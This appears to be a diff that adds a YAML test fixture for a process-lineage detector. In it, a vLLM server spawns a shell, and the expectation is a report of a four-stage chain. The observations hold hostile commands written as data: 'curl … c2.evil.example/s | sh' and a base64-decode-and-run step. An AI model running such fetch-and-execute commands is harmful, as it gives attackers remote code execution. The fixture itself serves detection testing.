@@ -1,0 +1,40 @@
+subjects:
+  bash:
+    session: pid/99:1
+    program: /bin/bash
+    actors: [{id: u1, name: Ops, email: ops@example.com, groups: [ml]}]
+    device: gpu-1
+    source: probe
+  vllm:
+    session: pid/100:1
+    parent: bash
+    program: /usr/local/bin/python3.11
+    actors: [{id: u1, name: Ops}]
+    device: gpu-1
+    source: probe
+  sh:
+    session: pid/101:1
+    parent: vllm
+    program: /bin/sh
+    actors: [{id: u1, name: Ops}]
+    device: gpu-1
+    source: probe
+  curl:
+    session: pid/102:1
+    parent: sh
+    program: /usr/bin/curl
+    actors: [{id: u1, name: Ops}]
+    device: gpu-1
+    source: probe
+observations:
+  - {kind: session_start, subject: bash}
+  - {kind: spawn, subject: vllm, cmdline: "python3.11 -m vllm.entrypoints.openai.api_server --model acme/llm --tensor-parallel-size 2"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'curl -s http://c2.evil.example/s | sh'"}
+  - {kind: spawn, subject: curl, cmdline: "curl -s http://c2.evil.example/s"}
+  - {kind: http_request, subject: curl, url: "http://c2.evil.example/s", method: GET, request_id: r1}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'base64 -d /tmp/.p | sh'"}
+trigger: 5
+expect:
+  action: report
+  reason_contains: "4 session-scoped stages; lineage sh <- python3.11 <- bash"
+  chain_min: 4
